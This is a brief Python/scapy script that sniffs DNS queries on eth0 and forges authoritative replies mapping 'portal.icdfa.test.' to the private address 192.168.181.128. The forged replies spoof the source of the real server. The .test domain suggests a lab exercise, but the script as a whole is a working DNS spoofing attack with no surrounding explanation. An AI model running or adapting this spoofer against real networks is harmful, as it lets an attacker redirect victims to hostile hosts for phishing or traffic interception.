from scapy.all import *

DOMAIN = "portal.icdfa.test."
ANSWER_IP = "192.168.181.128"

def handle(pkt):
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
        if pkt[DNSQR].qname.decode() == DOMAIN:
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                      an=DNSRR(rrname=DOMAIN, ttl=300, rdata=ANSWER_IP))
            send(ip/udp/dns, verbose=0)
            print(f"Answered {DOMAIN} -> {ANSWER_IP} for {pkt[IP].src}")

print("Listening for DNS queries on eth0...")
sniff(iface="eth0", filter="udp port 53", prn=handle)
